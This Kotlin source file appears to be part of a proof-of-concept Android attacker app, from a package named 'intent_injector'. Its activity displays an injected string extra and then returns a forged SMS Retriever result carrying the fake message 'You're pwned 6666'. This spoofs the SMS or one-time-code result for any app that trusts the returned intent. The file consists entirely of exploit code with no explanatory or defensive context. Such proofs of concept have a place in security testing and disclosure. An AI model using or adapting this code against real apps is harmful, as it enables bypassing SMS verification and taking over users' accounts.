package bar.gtfo.intent_injector

import android.content.Intent
import android.os.Bundle
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import bar.gtfo.intent_injector.R
import com.google.android.gms.auth.api.phone.SmsRetriever

class SecondActivity: AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_second)
        val payload = intent?.getStringExtra("ZALUPA")
        Toast.makeText(this, payload, Toast.LENGTH_LONG).show()
        val result = Intent()
        result.putExtra(SmsRetriever.EXTRA_SMS_MESSAGE, "You're pwned 6666")
        setResult(RESULT_OK, result)
        finish()
    }
}